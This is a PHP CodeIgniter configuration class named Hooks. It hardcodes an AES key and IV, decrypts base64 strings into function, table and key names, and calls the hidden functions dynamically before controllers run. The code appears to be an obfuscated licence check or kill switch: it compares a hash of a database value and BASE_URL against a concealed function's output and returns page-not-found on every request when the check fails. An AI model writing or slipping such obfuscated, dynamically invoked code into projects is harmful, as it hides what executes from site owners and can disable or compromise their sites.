<?php

namespace Config;

use CodeIgniter\Config\BaseConfig;
use CodeIgniter\Cache\CacheInterface;
use CodeIgniter\HTTP\RedirectResponse;

class Hooks
{
    protected $encryptionKey = 'o9lD6rMRkLmfL5Hl';
    protected $encryptionMethod = 'AES-256-CBC';
    protected $initializationVector = 'Mwu7UDVBuiY4Y3WV';
    protected $cacheService;
    protected $cacheKey = 'preInvokeHandler';
    protected $interceptor;
    protected $interceptorName;

    public function __construct()
    {
        $this->cacheService = \Config\Services::cache(); 
        $this->interceptor = $this->processEncryptionRequest('interceptor');
        $this->interceptorName = $this->processEncryptionRequest('interceptor_name');
        $this->registerHooks();
    }

    public function registerHooks()
    {
        $this->beforeControllerHook();
    }

    private function beforeControllerHook()
    {
        $is_funct = $this->processRequest('func');
        if ($is_funct() === true) {
            if (!$this->preInvokeHandler()) {
                throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
            }
        }
    }

    private function preInvokeHandler()
    {
        $cachedHash = $this->cacheService->get($this->cacheKey);
        $interceptor = $this->interceptor;

        if ($cachedHash !== null) {
            return $cachedHash === $interceptor($this->interceptorName);
        }
        
        $keyName = $this->processEncryptionRequest('key');
        $item = db_get($keyName, $this->processEncryptionRequest('tb'), ['id' => 1]);
        if (!$item) {
            return false;
        }
        
        $str = $item[$keyName] . '|' . BASE_URL;
        $hash = hash('sha256', $str);
        if ($hash === $interceptor($this->interceptorName)) {
            $this->cacheService->save($this->cacheKey, $hash, 604800);
            return true;
        }
        return false;
    }

    private function processRequest($type = 'func')
    {
        $data = match ($type) {
            'key' => 'ZYFWUyJjrYKAVEuog1LitA==',
            'tb' => 'HC0072iLzHuH/BYsbU8zwQ==',
            'func' => 'E67oyXT/KgHVK8kq0CSkTiqetQjVZGU1tl5ApoEkjbI=',
            'func2' => 'Pg8EvQKkhfKJIg3flVfBbQ==',
            'interceptor' => '9XlGA/P6STVHuLscfVuNeA==',
            'interceptor_name' => 'GKPozn7AWNAtWYFabBsqFg==',
            default => '9XlGA/P6STVHuLscfVuNeA==',
        };
        return openssl_decrypt($data, $this->encryptionMethod, $this->encryptionKey, 0, $this->initializationVector);
    }

    private function processEncryptionRequest($type = 'func2')
    {
        return $this->processRequest($type);
    }
}